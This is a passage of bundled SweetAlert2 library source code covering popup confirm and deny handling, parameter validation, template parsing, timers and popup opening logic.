            confirm(instance, inputValue);
          }
        });
      };
      var deny = function deny2(instance, value) {
        var innerParams = privateProps.innerParams.get(instance || _this);
        if (innerParams.showLoaderOnDeny) {
          showLoading(getDenyButton());
        }
        if (innerParams.preDeny) {
          instance.isAwaitingPromise = true;
          var preDenyPromise = Promise.resolve().then(function() {
            return asPromise(innerParams.preDeny(value, innerParams.validationMessage));
          });
          preDenyPromise.then(function(preDenyValue) {
            if (preDenyValue === false) {
              instance.hideLoading();
              handleAwaitingPromise(instance);
            } else {
              instance.close({
                isDenied: true,
                value: typeof preDenyValue === "undefined" ? value : preDenyValue
              });
            }
          })["catch"](function(error2) {
            return rejectWith(instance || _this, error2);
          });
        } else {
          instance.close({
            isDenied: true,
            value
          });
        }
      };
      var succeedWith = function succeedWith2(instance, value) {
        instance.close({
          isConfirmed: true,
          value
        });
      };
      var rejectWith = function rejectWith2(instance, error2) {
        instance.rejectPromise(error2);
      };
      var confirm = function confirm2(instance, value) {
        var innerParams = privateProps.innerParams.get(instance || _this);
        if (innerParams.showLoaderOnConfirm) {
          showLoading();
        }
        if (innerParams.preConfirm) {
          instance.resetValidationMessage();
          instance.isAwaitingPromise = true;
          var preConfirmPromise = Promise.resolve().then(function() {
            return asPromise(innerParams.preConfirm(value, innerParams.validationMessage));
          });
          preConfirmPromise.then(function(preConfirmValue) {
            if (isVisible$1(getValidationMessage()) || preConfirmValue === false) {
              instance.hideLoading();
              handleAwaitingPromise(instance);
            } else {
              succeedWith(instance, typeof preConfirmValue === "undefined" ? value : preConfirmValue);
            }
          })["catch"](function(error2) {
            return rejectWith(instance || _this, error2);
          });
        } else {
          succeedWith(instance, value);
        }
      };
      function hideLoading() {
        var innerParams = privateProps.innerParams.get(this);
        if (!innerParams) {
          return;
        }
        var domCache = privateProps.domCache.get(this);
        hide(domCache.loader);
        if (isToast()) {
          if (innerParams.icon) {
            show(getIcon());
          }
        } else {
          showRelatedButton(domCache);
        }
        removeClass([domCache.popup, domCache.actions], swalClasses.loading);
        domCache.popup.removeAttribute("aria-busy");
        domCache.popup.removeAttribute("data-loading");
        domCache.confirmButton.disabled = false;
        domCache.denyButton.disabled = false;
        domCache.cancelButton.disabled = false;
      }
      var showRelatedButton = function showRelatedButton2(domCache) {
        var buttonToReplace = domCache.popup.getElementsByClassName(domCache.loader.getAttribute("data-button-to-replace"));
        if (buttonToReplace.length) {
          show(buttonToReplace[0], "inline-block");
        } else if (allButtonsAreHidden()) {
          hide(domCache.actions);
        }
      };
      function getInput() {
        var innerParams = privateProps.innerParams.get(this);
        var domCache = privateProps.domCache.get(this);
        if (!domCache) {
          return null;
        }
        return getInput$1(domCache.popup, innerParams.input);
      }
      function setButtonsDisabled(instance, buttons, disabled) {
        var domCache = privateProps.domCache.get(instance);
        buttons.forEach(function(button) {
          domCache[button].disabled = disabled;
        });
      }
      function setInputDisabled(input, disabled) {
        var popup = getPopup();
        if (!popup || !input) {
          return;
        }
        if (input.type === "radio") {
          var radios = popup.querySelectorAll('[name="'.concat(swalClasses.radio, '"]'));
          for (var i = 0; i < radios.length; i++) {
            radios[i].disabled = disabled;
          }
        } else {
          input.disabled = disabled;
        }
      }
      function enableButtons() {
        setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], false);
      }
      function disableButtons() {
        setButtonsDisabled(this, ["confirmButton", "denyButton", "cancelButton"], true);
      }
      function enableInput() {
        setInputDisabled(this.getInput(), false);
      }
      function disableInput() {
        setInputDisabled(this.getInput(), true);
      }
      function showValidationMessage(error2) {
        var domCache = privateProps.domCache.get(this);
        var params = privateProps.innerParams.get(this);
        setInnerHtml(domCache.validationMessage, error2);
        domCache.validationMessage.className = swalClasses["validation-message"];
        if (params.customClass && params.customClass.validationMessage) {
          addClass(domCache.validationMessage, params.customClass.validationMessage);
        }
        show(domCache.validationMessage);
        var input = this.getInput();
        if (input) {
          input.setAttribute("aria-invalid", "true");
          input.setAttribute("aria-describedby", swalClasses["validation-message"]);
          focusInput(input);
          addClass(input, swalClasses.inputerror);
        }
      }
      function resetValidationMessage() {
        var domCache = privateProps.domCache.get(this);
        if (domCache.validationMessage) {
          hide(domCache.validationMessage);
        }
        var input = this.getInput();
        if (input) {
          input.removeAttribute("aria-invalid");
          input.removeAttribute("aria-describedby");
          removeClass(input, swalClasses.inputerror);
        }
      }
      var defaultParams = {
        title: "",
        titleText: "",
        text: "",
        html: "",
        footer: "",
        icon: void 0,
        iconColor: void 0,
        iconHtml: void 0,
        template: void 0,
        toast: false,
        animation: true,
        showClass: {
          popup: "swal2-show",
          backdrop: "swal2-backdrop-show",
          icon: "swal2-icon-show"
        },
        hideClass: {
          popup: "swal2-hide",
          backdrop: "swal2-backdrop-hide",
          icon: "swal2-icon-hide"
        },
        customClass: {},
        target: "body",
        color: void 0,
        backdrop: true,
        heightAuto: true,
        allowOutsideClick: true,
        allowEscapeKey: true,
        allowEnterKey: true,
        stopKeydownPropagation: true,
        keydownListenerCapture: false,
        showConfirmButton: true,
        showDenyButton: false,
        showCancelButton: false,
        preConfirm: void 0,
        preDeny: void 0,
        confirmButtonText: "OK",
        confirmButtonAriaLabel: "",
        confirmButtonColor: void 0,
        denyButtonText: "No",
        denyButtonAriaLabel: "",
        denyButtonColor: void 0,
        cancelButtonText: "Cancel",
        cancelButtonAriaLabel: "",
        cancelButtonColor: void 0,
        buttonsStyling: true,
        reverseButtons: false,
        focusConfirm: true,
        focusDeny: false,
        focusCancel: false,
        returnFocus: true,
        showCloseButton: false,
        closeButtonHtml: "&times;",
        closeButtonAriaLabel: "Close this dialog",
        loaderHtml: "",
        showLoaderOnConfirm: false,
        showLoaderOnDeny: false,
        imageUrl: void 0,
        imageWidth: void 0,
        imageHeight: void 0,
        imageAlt: "",
        timer: void 0,
        timerProgressBar: false,
        width: void 0,
        padding: void 0,
        background: void 0,
        input: void 0,
        inputPlaceholder: "",
        inputLabel: "",
        inputValue: "",
        inputOptions: {},
        inputAutoFocus: true,
        inputAutoTrim: true,
        inputAttributes: {},
        inputValidator: void 0,
        returnInputValueOnDeny: false,
        validationMessage: void 0,
        grow: false,
        position: "center",
        progressSteps: [],
        currentProgressStep: void 0,
        progressStepsDistance: void 0,
        willOpen: void 0,
        didOpen: void 0,
        didRender: void 0,
        willClose: void 0,
        didClose: void 0,
        didDestroy: void 0,
        scrollbarPadding: true
      };
      var updatableParams = ["allowEscapeKey", "allowOutsideClick", "background", "buttonsStyling", "cancelButtonAriaLabel", "cancelButtonColor", "cancelButtonText", "closeButtonAriaLabel", "closeButtonHtml", "color", "confirmButtonAriaLabel", "confirmButtonColor", "confirmButtonText", "currentProgressStep", "customClass", "denyButtonAriaLabel", "denyButtonColor", "denyButtonText", "didClose", "didDestroy", "footer", "hideClass", "html", "icon", "iconColor", "iconHtml", "imageAlt", "imageHeight", "imageUrl", "imageWidth", "preConfirm", "preDeny", "progressSteps", "returnFocus", "reverseButtons", "showCancelButton", "showCloseButton", "showConfirmButton", "showDenyButton", "text", "title", "titleText", "willClose"];
      var deprecatedParams = {
        allowEnterKey: void 0
      };
      var toastIncompatibleParams = ["allowOutsideClick", "allowEnterKey", "backdrop", "focusConfirm", "focusDeny", "focusCancel", "returnFocus", "heightAuto", "keydownListenerCapture"];
      var isValidParameter = function isValidParameter2(paramName) {
        return Object.prototype.hasOwnProperty.call(defaultParams, paramName);
      };
      var isUpdatableParameter = function isUpdatableParameter2(paramName) {
        return updatableParams.indexOf(paramName) !== -1;
      };
      var isDeprecatedParameter = function isDeprecatedParameter2(paramName) {
        return deprecatedParams[paramName];
      };
      var checkIfParamIsValid = function checkIfParamIsValid2(param) {
        if (!isValidParameter(param)) {
          warn('Unknown parameter "'.concat(param, '"'));
        }
      };
      var checkIfToastParamIsValid = function checkIfToastParamIsValid2(param) {
        if (toastIncompatibleParams.includes(param)) {
          warn('The parameter "'.concat(param, '" is incompatible with toasts'));
        }
      };
      var checkIfParamIsDeprecated = function checkIfParamIsDeprecated2(param) {
        var isDeprecated = isDeprecatedParameter(param);
        if (isDeprecated) {
          warnAboutDeprecation(param, isDeprecated);
        }
      };
      var showWarningsForParams = function showWarningsForParams2(params) {
        if (params.backdrop === false && params.allowOutsideClick) {
          warn('"allowOutsideClick" parameter requires `backdrop` parameter to be set to `true`');
        }
        for (var param in params) {
          checkIfParamIsValid(param);
          if (params.toast) {
            checkIfToastParamIsValid(param);
          }
          checkIfParamIsDeprecated(param);
        }
      };
      function update(params) {
        var popup = getPopup();
        var innerParams = privateProps.innerParams.get(this);
        if (!popup || hasClass(popup, innerParams.hideClass.popup)) {
          warn("You're trying to update the closed or closing popup, that won't work. Use the update() method in preConfirm parameter or show a new popup.");
          return;
        }
        var validUpdatableParams = filterValidParams(params);
        var updatedParams = Object.assign({}, innerParams, validUpdatableParams);
        render(this, updatedParams);
        privateProps.innerParams.set(this, updatedParams);
        Object.defineProperties(this, {
          params: {
            value: Object.assign({}, this.params, params),
            writable: false,
            enumerable: true
          }
        });
      }
      var filterValidParams = function filterValidParams2(params) {
        var validUpdatableParams = {};
        Object.keys(params).forEach(function(param) {
          if (isUpdatableParameter(param)) {
            validUpdatableParams[param] = params[param];
          } else {
            warn("Invalid parameter to update: ".concat(param));
          }
        });
        return validUpdatableParams;
      };
      function _destroy() {
        var domCache = privateProps.domCache.get(this);
        var innerParams = privateProps.innerParams.get(this);
        if (!innerParams) {
          disposeWeakMaps(this);
          return;
        }
        if (domCache.popup && globalState.swalCloseEventFinishedCallback) {
          globalState.swalCloseEventFinishedCallback();
          delete globalState.swalCloseEventFinishedCallback;
        }
        if (typeof innerParams.didDestroy === "function") {
          innerParams.didDestroy();
        }
        disposeSwal(this);
      }
      var disposeSwal = function disposeSwal2(instance) {
        disposeWeakMaps(instance);
        delete instance.params;
        delete globalState.keydownHandler;
        delete globalState.keydownTarget;
        delete globalState.currentInstance;
      };
      var disposeWeakMaps = function disposeWeakMaps2(instance) {
        if (instance.isAwaitingPromise) {
          unsetWeakMaps(privateProps, instance);
          instance.isAwaitingPromise = true;
        } else {
          unsetWeakMaps(privateMethods, instance);
          unsetWeakMaps(privateProps, instance);
          delete instance.isAwaitingPromise;
          delete instance.disableButtons;
          delete instance.enableButtons;
          delete instance.getInput;
          delete instance.disableInput;
          delete instance.enableInput;
          delete instance.hideLoading;
          delete instance.disableLoading;
          delete instance.showValidationMessage;
          delete instance.resetValidationMessage;
          delete instance.close;
          delete instance.closePopup;
          delete instance.closeModal;
          delete instance.closeToast;
          delete instance.rejectPromise;
          delete instance.update;
          delete instance._destroy;
        }
      };
      var unsetWeakMaps = function unsetWeakMaps2(obj, instance) {
        for (var i in obj) {
          obj[i]["delete"](instance);
        }
      };
      var instanceMethods = Object.freeze({
        __proto__: null,
        _destroy,
        close,
        closeModal: close,
        closePopup: close,
        closeToast: close,
        disableButtons,
        disableInput,
        disableLoading: hideLoading,
        enableButtons,
        enableInput,
        getInput,
        handleAwaitingPromise,
        hideLoading,
        rejectPromise,
        resetValidationMessage,
        showValidationMessage,
        update
      });
      var handlePopupClick = function handlePopupClick2(innerParams, domCache, dismissWith) {
        if (innerParams.toast) {
          handleToastClick(innerParams, domCache, dismissWith);
        } else {
          handleModalMousedown(domCache);
          handleContainerMousedown(domCache);
          handleModalClick(innerParams, domCache, dismissWith);
        }
      };
      var handleToastClick = function handleToastClick2(innerParams, domCache, dismissWith) {
        domCache.popup.onclick = function() {
          if (innerParams && (isAnyButtonShown(innerParams) || innerParams.timer || innerParams.input)) {
            return;
          }
          dismissWith(DismissReason.close);
        };
      };
      var isAnyButtonShown = function isAnyButtonShown2(innerParams) {
        return !!(innerParams.showConfirmButton || innerParams.showDenyButton || innerParams.showCancelButton || innerParams.showCloseButton);
      };
      var ignoreOutsideClick = false;
      var handleModalMousedown = function handleModalMousedown2(domCache) {
        domCache.popup.onmousedown = function() {
          domCache.container.onmouseup = function(e) {
            domCache.container.onmouseup = function() {
            };
            if (e.target === domCache.container) {
              ignoreOutsideClick = true;
            }
          };
        };
      };
      var handleContainerMousedown = function handleContainerMousedown2(domCache) {
        domCache.container.onmousedown = function(e) {
          if (e.target === domCache.container) {
            e.preventDefault();
          }
          domCache.popup.onmouseup = function(e2) {
            domCache.popup.onmouseup = function() {
            };
            if (e2.target === domCache.popup || e2.target instanceof HTMLElement && domCache.popup.contains(e2.target)) {
              ignoreOutsideClick = true;
            }
          };
        };
      };
      var handleModalClick = function handleModalClick2(innerParams, domCache, dismissWith) {
        domCache.container.onclick = function(e) {
          if (ignoreOutsideClick) {
            ignoreOutsideClick = false;
            return;
          }
          if (e.target === domCache.container && callIfFunction(innerParams.allowOutsideClick)) {
            dismissWith(DismissReason.backdrop);
          }
        };
      };
      var isJqueryElement = function isJqueryElement2(elem) {
        return _typeof(elem) === "object" && elem.jquery;
      };
      var isElement = function isElement2(elem) {
        return elem instanceof Element || isJqueryElement(elem);
      };
      var argsToParams = function argsToParams2(args) {
        var params = {};
        if (_typeof(args[0]) === "object" && !isElement(args[0])) {
          Object.assign(params, args[0]);
        } else {
          ["title", "html", "icon"].forEach(function(name, index) {
            var arg = args[index];
            if (typeof arg === "string" || isElement(arg)) {
              params[name] = arg;
            } else if (arg !== void 0) {
              error("Unexpected type of ".concat(name, '! Expected "string" or "Element", got ').concat(_typeof(arg)));
            }
          });
        }
        return params;
      };
      function fire() {
        for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
          args[_key] = arguments[_key];
        }
        return _construct(this, args);
      }
      function mixin(mixinParams) {
        var MixinSwal = function(_this2) {
          function MixinSwal2() {
            _classCallCheck(this, MixinSwal2);
            return _callSuper(this, MixinSwal2, arguments);
          }
          _inherits(MixinSwal2, _this2);
          return _createClass(MixinSwal2, [{
            key: "_main",
            value: function _main(params, priorityMixinParams) {
              return _superPropGet(MixinSwal2, "_main", this)([params, Object.assign({}, mixinParams, priorityMixinParams)]);
            }
          }]);
        }(this);
        return MixinSwal;
      }
      var getTimerLeft = function getTimerLeft2() {
        return globalState.timeout && globalState.timeout.getTimerLeft();
      };
      var stopTimer = function stopTimer2() {
        if (globalState.timeout) {
          stopTimerProgressBar();
          return globalState.timeout.stop();
        }
      };
      var resumeTimer = function resumeTimer2() {
        if (globalState.timeout) {
          var remaining = globalState.timeout.start();
          animateTimerProgressBar(remaining);
          return remaining;
        }
      };
      var toggleTimer = function toggleTimer2() {
        var timer = globalState.timeout;
        return timer && (timer.running ? stopTimer() : resumeTimer());
      };
      var increaseTimer = function increaseTimer2(ms) {
        if (globalState.timeout) {
          var remaining = globalState.timeout.increase(ms);
          animateTimerProgressBar(remaining, true);
          return remaining;
        }
      };
      var isTimerRunning = function isTimerRunning2() {
        return !!(globalState.timeout && globalState.timeout.isRunning());
      };
      var bodyClickListenerAdded = false;
      var clickHandlers = {};
      function bindClickHandler() {
        var attr = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : "data-swal-template";
        clickHandlers[attr] = this;
        if (!bodyClickListenerAdded) {
          document.body.addEventListener("click", bodyClickListener);
          bodyClickListenerAdded = true;
        }
      }
      var bodyClickListener = function bodyClickListener2(event) {
        for (var el = event.target; el && el !== document; el = el.parentNode) {
          for (var attr in clickHandlers) {
            var template = el.getAttribute(attr);
            if (template) {
              clickHandlers[attr].fire({
                template
              });
              return;
            }
          }
        }
      };
      var staticMethods = Object.freeze({
        __proto__: null,
        argsToParams,
        bindClickHandler,
        clickCancel,
        clickConfirm,
        clickDeny,
        enableLoading: showLoading,
        fire,
        getActions,
        getCancelButton,
        getCloseButton,
        getConfirmButton,
        getContainer,
        getDenyButton,
        getFocusableElements,
        getFooter,
        getHtmlContainer,
        getIcon,
        getIconContent,
        getImage,
        getInputLabel,
        getLoader,
        getPopup,
        getProgressSteps,
        getTimerLeft,
        getTimerProgressBar,
        getTitle,
        getValidationMessage,
        increaseTimer,
        isDeprecatedParameter,
        isLoading,
        isTimerRunning,
        isUpdatableParameter,
        isValidParameter,
        isVisible,
        mixin,
        resumeTimer,
        showLoading,
        stopTimer,
        toggleTimer
      });
      var Timer = function() {
        function Timer2(callback, delay) {
          _classCallCheck(this, Timer2);
          this.callback = callback;
          this.remaining = delay;
          this.running = false;
          this.start();
        }
        return _createClass(Timer2, [{
          key: "start",
          value: function start() {
            if (!this.running) {
              this.running = true;
              this.started = /* @__PURE__ */ new Date();
              this.id = setTimeout(this.callback, this.remaining);
            }
            return this.remaining;
          }
          /**
           * @returns {number}
           */
        }, {
          key: "stop",
          value: function stop() {
            if (this.started && this.running) {
              this.running = false;
              clearTimeout(this.id);
              this.remaining -= (/* @__PURE__ */ new Date()).getTime() - this.started.getTime();
            }
            return this.remaining;
          }
          /**
           * @param {number} n
           * @returns {number}
           */
        }, {
          key: "increase",
          value: function increase(n) {
            var running = this.running;
            if (running) {
              this.stop();
            }
            this.remaining += n;
            if (running) {
              this.start();
            }
            return this.remaining;
          }
          /**
           * @returns {number}
           */
        }, {
          key: "getTimerLeft",
          value: function getTimerLeft2() {
            if (this.running) {
              this.stop();
              this.start();
            }
            return this.remaining;
          }
          /**
           * @returns {boolean}
           */
        }, {
          key: "isRunning",
          value: function isRunning() {
            return this.running;
          }
        }]);
      }();
      var swalStringParams = ["swal-title", "swal-html", "swal-footer"];
      var getTemplateParams = function getTemplateParams2(params) {
        var template = typeof params.template === "string" ? (
          /** @type {HTMLTemplateElement} */
          document.querySelector(params.template)
        ) : params.template;
        if (!template) {
          return {};
        }
        var templateContent = template.content;
        showWarningsForElements(templateContent);
        var result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
        return result;
      };
      var getSwalParams = function getSwalParams2(templateContent) {
        var result = {};
        var swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
        swalParams.forEach(function(param) {
          showWarningsForAttributes(param, ["name", "value"]);
          var paramName = (
            /** @type {keyof SweetAlertOptions} */
            param.getAttribute("name")
          );
          var value = param.getAttribute("value");
          if (!paramName || !value) {
            return;
          }
          if (typeof defaultParams[paramName] === "boolean") {
            result[paramName] = value !== "false";
          } else if (_typeof(defaultParams[paramName]) === "object") {
            result[paramName] = JSON.parse(value);
          } else {
            result[paramName] = value;
          }
        });
        return result;
      };
      var getSwalFunctionParams = function getSwalFunctionParams2(templateContent) {
        var result = {};
        var swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
        swalFunctions.forEach(function(param) {
          var paramName = (
            /** @type {keyof SweetAlertOptions} */
            param.getAttribute("name")
          );
          var value = param.getAttribute("value");
          if (!paramName || !value) {
            return;
          }
          result[paramName] = new Function("return ".concat(value))();
        });
        return result;
      };
      var getSwalButtons = function getSwalButtons2(templateContent) {
        var result = {};
        var swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
        swalButtons.forEach(function(button) {
          showWarningsForAttributes(button, ["type", "color", "aria-label"]);
          var type = button.getAttribute("type");
          if (!type || !["confirm", "cancel", "deny"].includes(type)) {
            return;
          }
          result["".concat(type, "ButtonText")] = button.innerHTML;
          result["show".concat(capitalizeFirstLetter(type), "Button")] = true;
          if (button.hasAttribute("color")) {
            result["".concat(type, "ButtonColor")] = button.getAttribute("color");
          }
          if (button.hasAttribute("aria-label")) {
            result["".concat(type, "ButtonAriaLabel")] = button.getAttribute("aria-label");
          }
        });
        return result;
      };
      var getSwalImage = function getSwalImage2(templateContent) {
        var result = {};
        var image = templateContent.querySelector("swal-image");
        if (image) {
          showWarningsForAttributes(image, ["src", "width", "height", "alt"]);
          if (image.hasAttribute("src")) {
            result.imageUrl = image.getAttribute("src") || void 0;
          }
          if (image.hasAttribute("width")) {
            result.imageWidth = image.getAttribute("width") || void 0;
          }
          if (image.hasAttribute("height")) {
            result.imageHeight = image.getAttribute("height") || void 0;
          }
          if (image.hasAttribute("alt")) {
            result.imageAlt = image.getAttribute("alt") || void 0;
          }
        }
        return result;
      };
      var getSwalIcon = function getSwalIcon2(templateContent) {
        var result = {};
        var icon = templateContent.querySelector("swal-icon");
        if (icon) {
          showWarningsForAttributes(icon, ["type", "color"]);
          if (icon.hasAttribute("type")) {
            result.icon = icon.getAttribute("type");
          }
          if (icon.hasAttribute("color")) {
            result.iconColor = icon.getAttribute("color");
          }
          result.iconHtml = icon.innerHTML;
        }
        return result;
      };
      var getSwalInput = function getSwalInput2(templateContent) {
        var result = {};
        var input = templateContent.querySelector("swal-input");
        if (input) {
          showWarningsForAttributes(input, ["type", "label", "placeholder", "value"]);
          result.input = input.getAttribute("type") || "text";
          if (input.hasAttribute("label")) {
            result.inputLabel = input.getAttribute("label");
          }
          if (input.hasAttribute("placeholder")) {
            result.inputPlaceholder = input.getAttribute("placeholder");
          }
          if (input.hasAttribute("value")) {
            result.inputValue = input.getAttribute("value");
          }
        }
        var inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
        if (inputOptions.length) {
          result.inputOptions = {};
          inputOptions.forEach(function(option) {
            showWarningsForAttributes(option, ["value"]);
            var optionValue = option.getAttribute("value");
            if (!optionValue) {
              return;
            }
            var optionName = option.innerHTML;
            result.inputOptions[optionValue] = optionName;
          });
        }
        return result;
      };
      var getSwalStringParams = function getSwalStringParams2(templateContent, paramNames) {
        var result = {};
        for (var i in paramNames) {
          var paramName = paramNames[i];
          var tag = templateContent.querySelector(paramName);
          if (tag) {
            showWarningsForAttributes(tag, []);
            result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
          }
        }
        return result;
      };
      var showWarningsForElements = function showWarningsForElements2(templateContent) {
        var allowedElements = swalStringParams.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
        Array.from(templateContent.children).forEach(function(el) {
          var tagName = el.tagName.toLowerCase();
          if (!allowedElements.includes(tagName)) {
            warn("Unrecognized element <".concat(tagName, ">"));
          }
        });
      };
      var showWarningsForAttributes = function showWarningsForAttributes2(el, allowedAttributes) {
        Array.from(el.attributes).forEach(function(attribute) {
          if (allowedAttributes.indexOf(attribute.name) === -1) {
            warn(['Unrecognized attribute "'.concat(attribute.name, '" on <').concat(el.tagName.toLowerCase(), ">."), "".concat(allowedAttributes.length ? "Allowed attributes are: ".concat(allowedAttributes.join(", ")) : "To set the value, use HTML within the element.")]);
          }
        });
      };
      var SHOW_CLASS_TIMEOUT = 10;
      var openPopup = function openPopup2(params) {
        var container = getContainer();
        var popup = getPopup();
        if (typeof params.willOpen === "function") {
          params.willOpen(popup);
        }
        var bodyStyles = window.getComputedStyle(document.body);
        var initialBodyOverflow = bodyStyles.overflowY;
        addClasses(container, popup, params);
        setTimeout(function() {
          setScrollingVisibility(container, popup);
        }, SHOW_CLASS_TIMEOUT);
        if (isModal()) {
          fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
          setAriaHidden();
        }
        if (!isToast() && !globalState.previousActiveElement) {
          globalState.previousActiveElement = document.activeElement;
        }
        if (typeof params.didOpen === "function") {
          setTimeout(function() {
            return params.didOpen(popup);
          });
        }
        removeClass(container, swalClasses["no-transition"]);
      };
      var _swalOpenAnimationFinished = function swalOpenAnimationFinished(event) {
        var popup = getPopup();
        if (event.target !== popup || !animationEndEvent) {
          return;
        }
        var container = getContainer();
        popup.removeEventListener(animationEndEvent, _swalOpenAnimationFinished);
        container.style.overflowY = "auto";
      };
      var setScrollingVisibility = function setScrollingVisibility2(container, popup) {
        if (animationEndEvent && hasCssAnimation(popup)) {
          container.style.overflowY = "hidden";
          popup.addEventListener(animationEndEvent, _swalOpenAnimationFinished);
        } else {
          container.style.overflowY = "auto";
        }
      };
      var fixScrollContainer = function fixScrollContainer2(container, scrollbarPadding, initialBodyOverflow) {
        iOSfix();
        if (scrollbarPadding && initialBodyOverflow !== "hidden") {
          replaceScrollbarWithPadding(initialBodyOverflow);
        }
        setTimeout(function() {
          container.scrollTop = 0;
        });
      };
      var addClasses = function addClasses2(container, popup, params) {
        addClass(container, params.showClass.backdrop);
        if (params.animation) {
          popup.style.setProperty("opacity", "0", "important");
          show(popup, "grid");
          setTimeout(function() {
            addClass(popup, params.showClass.popup);
            popup.style.removeProperty("opacity");
          }, SHOW_CLASS_TIMEOUT);
        } else {
          show(popup, "grid");
        }
        addClass([document.documentElement, document.body], swalClasses.shown);
        if (params.heightAuto && params.backdrop && !params.toast) {
          addClass([document.documentElement, document.body], swalClasses["height-auto"]);
        }
      };
      var defaultInputValidators = {
        /**
         * @param {string} string
         * @param {string} [validationMessage]
         * @returns {Promise<string | void>}
         */
        email: function email(string, validationMessage) {
          return /^[a-zA-Z0-9.+_'-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]+$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
        },
        /**
         * @param {string} string
         * @param {string} [validationMessage]
         * @returns {Promise<string | void>}
         */
        url: function url(string, validationMessage) {
          return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
        }
      };
      function setDefaultInputValidators(params) {
        if (params.inputValidator) {
          return;
        }
        if (params.input === "email") {
          params.inputValidator = defaultInputValidators["email"];
        }
        if (params.input === "url") {
          params.inputValidator = defaultInputValidators["url"];
        }
      }
      function validateCustomTargetElement(params) {
        if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
          warn('Target parameter is not valid, defaulting to "body"');
          params.target = "body";
        }
      }
      function setParameters(params) {
        setDefaultInputValidators(params);
        if (params.showLoaderOnConfirm && !params.preConfirm) {
          warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
        }
        validateCustomTargetElement(params);
        if (typeof params.title === "string") {
          params.title = params.title.split("\n").join("<br />");
        }
        init(params);
      }
      var currentInstance;
      var _promise = /* @__PURE__ */ new WeakMap();
      var SweetAlert = function() {
        function SweetAlert2() {
          _classCallCheck(this, SweetAlert2);
          _classPrivateFieldInitSpec(this, _promise, void 0);
          if (typeof window === "undefined") {
            return;
          }
          currentInstance = this;
          for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
            args[_key] = arguments[_key];
          }
          var outerParams = Object.freeze(this.constructor.argsToParams(args));
          this.params = outerParams;
          this.isAwaitingPromise = false;
          _classPrivateFieldSet2(_promise, this, this._main(currentInstance.params));
        }
        return _createClass(SweetAlert2, [{
          key: "_main",
          value: function _main(userParams) {
            var mixinParams = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
            showWarningsForParams(Object.assign({}, mixinParams, userParams));
            if (globalState.currentInstance) {
              var swalPromiseResolve = privateMethods.swalPromiseResolve.get(globalState.currentInstance);
              var isAwaitingPromise = globalState.currentInstance.isAwaitingPromise;
              globalState.currentInstance._destroy();
              if (!isAwaitingPromise) {
                swalPromiseResolve({
                  isDismissed: true
                });
              }
              if (isModal()) {
                unsetAriaHidden();
              }
            }
            globalState.currentInstance = currentInstance;
            var innerParams = prepareParams(userParams, mixinParams);
            setParameters(innerParams);
            Object.freeze(innerParams);
            if (globalState.timeout) {
              globalState.timeout.stop();
              delete globalState.timeout;
            }
            clearTimeout(globalState.restoreFocusTimeout);
            var domCache = populateDomCache(currentInstance);
            render(currentInstance, innerParams);
            privateProps.innerParams.set(currentInstance, innerParams);
            return swalPromise(currentInstance, domCache, innerParams);
          }
          // `catch` cannot be the name of a module export, so we define our thenable methods here instead
        }, {
          key: "then",
          value: function then(onFulfilled) {
            return _classPrivateFieldGet2(_promise, this).then(onFulfilled);
          }
        }, {
          key: "finally",
          value: function _finally(onFinally) {
            return _classPrivateFieldGet2(_promise, this)["finally"](onFinally);
          }
        }]);
      }();
      var swalPromise = function swalPromise2(instance, domCache, innerParams) {
        return new Promise(function(resolve, reject) {
          var dismissWith = function dismissWith2(dismiss) {
            instance.close({
              isDismissed: true,
              dismiss
            });
          };
          privateMethods.swalPromiseResolve.set(instance, resolve);
          privateMethods.swalPromiseReject.set(instance, reject);
          domCache.confirmButton.onclick = function() {
            handleConfirmButtonClick(instance);
          };
          domCache.denyButton.onclick = function() {
            handleDenyButtonClick(instance);
          };
          domCache.cancelButton.onclick = function() {
            handleCancelButtonClick(instance, dismissWith);
          };
          domCache.closeButton.onclick = function() {
            dismissWith(DismissReason.close);
          };
          handlePopupClick(innerParams, domCache, dismissWith);
          addKeydownHandler(globalState, innerParams, dismissWith);
          handleInputOptionsAndValue(instance, innerParams);
          openPopup(innerParams);
          setupTimer(globalState, innerParams, dismissWith);
          initFocus(domCache, innerParams);
          setTimeout(function() {
            domCache.container.scrollTop = 0;
          });
        });
      };
      var prepareParams = function prepareParams2(userParams, mixinParams) {
        var templateParams = getTemplateParams(userParams);
        var params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams);
        params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
        params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
        if (params.animation === false) {
          params.showClass = {
            backdrop: "swal2-noanimation"
          };
          params.hideClass = {};
        }
        return params;
      };
      var populateDomCache = function populateDomCache2(instance) {
        var domCache = {
          popup: getPopup(),
          container: getContainer(),
          actions: getActions(),
          confirmButton: getConfirmButton(),
          denyButton: getDenyButton(),
          cancelButton: getCancelButton(),
          loader: getLoader(),
          closeButton: getCloseButton(),
          validationMessage: getValidationMessage(),
          progressSteps: getProgressSteps()
        };
        privateProps.domCache.set(instance, domCache);
        return domCache;
      };
